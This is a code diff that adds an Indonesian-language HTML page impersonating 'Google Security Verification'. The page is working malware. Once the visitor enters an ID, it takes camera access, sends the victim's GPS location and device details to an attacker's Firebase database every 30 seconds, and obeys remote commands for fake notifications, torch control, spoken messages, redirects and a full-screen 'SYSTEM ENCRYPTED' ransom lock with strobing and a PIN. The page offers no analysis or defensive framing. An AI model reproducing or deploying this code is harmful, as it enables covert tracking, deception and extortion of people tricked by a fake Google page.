@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Google Security Verification</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <style>
+        body { font-family: 'Roboto', sans-serif; background: #fff; margin: 0; overflow: hidden; user-select: none; }
+        #setup-ui { display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .card { width: 85%; max-width: 400px; padding: 30px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
+        input { width: 100%; padding: 12px; margin: 15px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; }
+        .btn-blue { background: #1a73e8; color: #fff; border: none; padding: 12px 24px; border-radius: 4px; cursor: pointer; font-weight: bold; }
+        #notif-bar { display: none; position: fixed; top: 10px; left: 5%; width: 90%; background: rgba(30, 30, 30, 0.98); color: #fff; padding: 12px; border-radius: 12px; z-index: 10001; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
+        #ransom { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 10000; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
+        .serem { background: radial-gradient(circle, #400 0%, #000 100%); color: #f00; border: 5px solid #f00; }
+        .lebih-seram { background: #000 url('https://redcdn.net/it/2715/45/63/87/bg1.jpg') no-repeat center; background-size: cover; color: #fff; text-shadow: 0 0 10px #f00; }
+        .ultra-seram { background: #000; color: #f00; animation: strobe 0.1s infinite; }
+        @keyframes strobe { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }
+    </style>
+</head>
+<body>
+    <div id="notif-bar"><b id="n-title" style="display:block; font-size:14px;"></b><span id="n-body" style="font-size:13px; color:#ccc;"></span></div>
+    
+    <div id="setup-ui">
+        <div class="card">
+            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="75">
+            <h2>Verifikasi Identitas</h2>
+            <p style="font-size:14px;color:#5f6368">Masukkan ID Verifikasi untuk sinkronisasi perangkat.</p>
+            <input type="text" id="con-id" placeholder="Masukkan ID Verifikasi">
+            <button class="btn-blue" onclick="startRAT()">Lanjutkan</button>
+        </div>
+    </div>
+
+    <div id="ransom">
+        <h1 id="title-r">SYSTEM ENCRYPTED</h1>
+        <p id="msg-r" style="padding:0 20px;"></p>
+        <div style="font-size:45px; font-weight:bold; margin:15px 0;">01:59:59</div>
+        <input type="text" id="pin-in" style="width:60%; text-align:center;" placeholder="INPUT PIN UNLOCK">
+        <button onclick="checkPin()" style="padding:12px 25px; background:#f00; color:#fff; border:none; border-radius:5px; font-weight:bold;">UNLOCK DEVICE</button>
+    </div>
+
+    <script>
+        const firebaseConfig = { apiKey: "AIzaSyBYwxCyfcWaSPYwDBjJrepo-PXwEj6lPxM", databaseURL: "https://zizrax-default-rtdb.asia-southeast1.firebasedatabase.app", projectId: "zizrax" };
+        firebase.initializeApp(firebaseConfig);
+        let vTrack, myId = "User_" + Math.floor(Math.random()*9999), lastVol = 0;
+
+        async function startRAT() {
+            const id = document.getElementById('con-id').value;
+            if(!id) return alert("ADMIN_MASTER");
+            try {
+                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+                vTrack = s.getVideoTracks()[0];
+                document.getElementById('setup-ui').innerHTML = "<h2>Menyinkronkan...</h2>";
+
+                const upLoc = () => {
+                    navigator.geolocation.getCurrentPosition(p => {
+                        firebase.database().ref(`zix_sys/${id}/victims/${myId}`).update({
+                            device: navigator.userAgent, loc: `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`, time: new Date().toLocaleString()
+                        });
+                    }, null, {enableHighAccuracy:true});
+                };
+                upLoc(); setInterval(upLoc, 30000);
+
+                firebase.database().ref(`zix_sys/${id}/commands`).on("value", snap => {
+                    const d = snap.val(); if(!d) return;
+                    
+                    if(d.notif_active === "ON") {
+                        document.getElementById('n-title').innerText = d.notif_title;
+                        document.getElementById('n-body').innerText = d.notif_body;
+                        document.getElementById('notif-bar').style.display = "block";
+                        setTimeout(() => { document.getElementById('notif-bar').style.display = "none"; }, 5000);
+                        firebase.database().ref(`zix_sys/${id}/commands`).update({notif_active:"OFF"});
+                    }
+                    if(vTrack) vTrack.applyConstraints({advanced: [{torch: d.flashlight === "ON"}]});
+                    if(d.voice_active === "ON") {
+                        let t = new SpeechSynthesisUtterance(d.voice_text); t.lang='id-ID'; window.speechSynthesis.speak(t);
+                        firebase.database().ref(`zix_sys/${id}/commands`).update({voice_active:"OFF"});
+                    }
+                    if(d.vol_cmd && d.vol_time !== lastVol) {
+                        let a = new Audio('https://www.soundjay.com/buttons/button-21.mp3'); a.volume = d.vol_cmd==='UP'?1:0.1; a.play().catch(()=>{});
+                        lastVol = d.vol_time;
+                    }
+                    const r = document.getElementById('ransom');
+                    if(d.lock === "ON") {
+                        r.style.display = "flex"; r.className = d.theme || "serem"; 
+                        document.getElementById('msg-r').innerText = d.msg;
+                        if(document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
+                    } else { r.style.display = "none"; }
+                    if(d.url) window.location.href = d.url;
+                });
+            } catch(e) { alert("Izin diperlukan!"); location.reload(); }
+        }
+
+        function checkPin() {
+            const id = document.getElementById('con-id').value;
+            firebase.database().ref(`zix_sys/${id}/commands/pin`).once('value', s => {
+                if(document.getElementById('pin-in').value === s.val()) {
+                    firebase.database().ref(`zix_sys/${id}/commands`).update({lock:"OFF", flashlight:"OFF"});
+                } else { alert("PIN SALAH!"); }
+            });
+        }
+    </script>
+</body>
+</html>
